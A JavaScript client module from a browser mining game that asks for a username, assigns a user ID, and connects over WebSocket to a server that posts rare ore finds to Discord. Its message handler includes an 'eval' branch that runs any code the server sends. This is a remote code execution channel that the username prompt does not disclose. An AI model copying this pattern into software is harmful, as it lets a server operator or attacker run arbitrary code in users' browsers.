import { ores, tiers } from "./content/items.js";
import Color from "./color.js";
import vars from "./vars.js";

let username = localStorage.getItem("tdd-username");
let userID = localStorage.getItem("tdd-userID");

async function getUsername() {
    return new Promise(resolve => {
        const menu = document.createElement("div");
        menu.classList.add("gui");
        menu.id = "username-ui";

        menu.style.zIndex = 1005;
        menu.style.display = "block";
        menu.style.padding = "max(4dvw, 2dvh)";
        menu.style.boxSizing = "border-box";
        document.body.appendChild(menu);

        const title = document.createElement("span");
        title.classList.add("wikiName");
        title.innerText = "Welcome!";
        menu.appendChild(title);

        const span = document.createElement("span");
        span.classList.add("wikiText");
        span.innerText = "Please select a username. This will be used only for announcing your rare finds to the Discord server and for death messages (local)."
        + " Alternatively, you may decline and play entirely locally.";
        const span2 = document.createElement("span");
        span2.classList.add("wikiText");
        span2.style.marginTop = "1dvh";
        span2.innerText = "You can change, enable, or disable this from settings at any time.";
        menu.appendChild(span);
        menu.appendChild(span2);

        const input = document.createElement("input");
        input.placeholder = "Enter Username Here";
        input.style.position = "absolute";
        input.style.top = "50%";
        input.style.transform = "translateY(-50%)"
        input.style.left = "max(4dvw, 2dvh)";
        input.style.width = "calc(100% - max(8dvw, 4dvh)";
        menu.appendChild(input);

        const selectBtn = document.createElement("button");
        selectBtn.innerText = "Confirm";
        selectBtn.classList.add("menuButton", "username-selectBtn");
        selectBtn.style.position = "absolute";
        selectBtn.style.bottom = "max(4dvw, 2dvh)";
        selectBtn.style.width = "calc(50% - max(8dvw, 4dvh)";
        menu.appendChild(selectBtn);

        selectBtn.addEventListener("click", () => {
            menu.remove();
            resolve(input.value);
        });

        const ignoreBtn = document.createElement("button");
        ignoreBtn.innerText = "Ignore";
        ignoreBtn.classList.add("menuButton", "username-ignoreBtn");
        ignoreBtn.style.position = "absolute";
        ignoreBtn.style.bottom = "max(4dvw, 2dvh)";
        ignoreBtn.style.right = ignoreBtn.style.bottom;
        ignoreBtn.style.width = "calc(50% - max(8dvw, 4dvh)";
        menu.appendChild(ignoreBtn);

        ignoreBtn.addEventListener("click", () => {
            menu.remove();
            vars.setUsername = true;
            resolve("undefined");
        });
    });
}

function startAnimations() {
    setTimeout(() => {
        getElementById("logo").style.display = "";
        getElementById("logo").style.animation = "initLogo 4s ease-in-out";
        getElementById("logo").style.animationFillMode = "forwards";
        setTimeout(() => {
            getElementById("menu-mask").style.animation = "initMask 2.4s ease-in-out";
            getElementById("menu-mask").style.animationFillMode = "forwards";
        }, 1600);
    }, 0);
}

if (!username) username = await getUsername();
vars.setUsername = true;
vars.username = username;
localStorage.setItem("tdd-username", username);
startAnimations();

if (!userID) {
    userID = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    localStorage.setItem("tdd-userID", userID);
}

document.getElementById("user-id").innerText = `Your username is ${username}. Your user ID is ${userID}.`;

let wsURL = "wss://ttunnel-server.onrender.com";
if (window.location.hostname.includes("localhost")) wsURL = "ws://localhost:3000";

let ws = new WebSocket(wsURL);
if (username === "undefined") ws.close();

function ping(ws) {
    ws.send(JSON.stringify({type: "ping", data: {username, userID}}));
}

function websocketMessageHandler(event, forceUserID = false) {
    const data = JSON.parse(event.data);
    if (data.userID && data.userID !== userID) return;
    if (data.excludedUsers && data.excludedUsers.includes(userID) && !forceUserID) return;
    if (data.type === "message") {
        console.log(data.message);
    } else if (data.type === "alert") {
        displayAlert(data.msg, data.color, data.time, data.borderColor);
    } else if (data.type === "eval") {
        try {
            eval(data.code);
        } catch (e) {
            console.error("Error executing eval code:", e);
        }
    }
}

ws.onopen = () => {
    console.log("Connected to WebSocket server");
    ping(ws);
}
ws.onmessage = websocketMessageHandler;
ws.onclose = event => {
    if (event.reason === "Invalid origin") {
        console.warn("Connection closed due to invalid origin. Please play at https://tranquanto.github.io/the-draconic-depths for your finds to be announced!");
        clearInterval(reconnectInterval);
    } else {
        console.warn("WebSocket closed.");
    }
}

function sendMessage(msg) {
    if (msg.type === "broadcast") {
        websocketMessageHandler({data: JSON.stringify(msg.data)}, true);
    }
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify(msg));
    }
}

export function webhookMessage(title, desc, ore, chance, pos, footer) {
    const color = new Color(ores[ore].firstColor).toString({format: "hex", collapse: false});
    const t = Math.floor(Date.now() / 1000);
    desc += `\nFound <t:${t}:D> at <t:${t}:T>`;
    const data = {
        embeds: [
            {
                title,
                description: desc,
                color: parseInt(color.slice(1), 16),
                fields: [
                    {
                        name: "Rarity",
                        value: `${formatChance(chance, "en-US")}`,
                        inline: true
                    },
                    {
                        name: "Tier",
                        value: tiers[ores[ore].tier].name,
                        inline: true
                    },
                    {
                        name: "Pickaxe",
                        value: `${vars.inventory.currentPickaxe.name || "None"}`,
                        inline: true
                    },
                    {
                        name: pos.y > 0 ? "Altitude" : "Depth",
                        value: `${pos.y.toLocaleString("en-US")}m (||${pos.layer}||)`,
                        inline: true
                    },
                    {
                        name: "Position",
                        value: `||${pos.x}, ${pos.z.toLocaleString("en-US")}||`,
                        inline: true
                    },
                    {
                        name: "Seed",
                        value: `||${vars.seed.toString()}||`,
                        inline: true
                    }
                ]
            }
        ]
    };
    if (footer) data.embeds[0].footer = footer || undefined;
    console.log(data);
    sendMessage({type: "webhook", data, userID});
}

let attempts = 0;
const reconnectInterval = setInterval(() => {
    attempts++;
    if ((Math.sqrt(8 * attempts + 1) / 2 + 0.5) % 1 !== 0) return;
    // if websocket closes, try to reconnect
    if (ws.readyState === WebSocket.CLOSED) {
        console.log("Trying to reconnect to WebSocket...");
        ws = new WebSocket(wsURL);
        ws.onopen = () => {
            attempts = 0;
            console.log("WebSocket reconnected!");
            ping(ws);
        };
        ws.onmessage = websocketMessageHandler;
    }
}, 10000);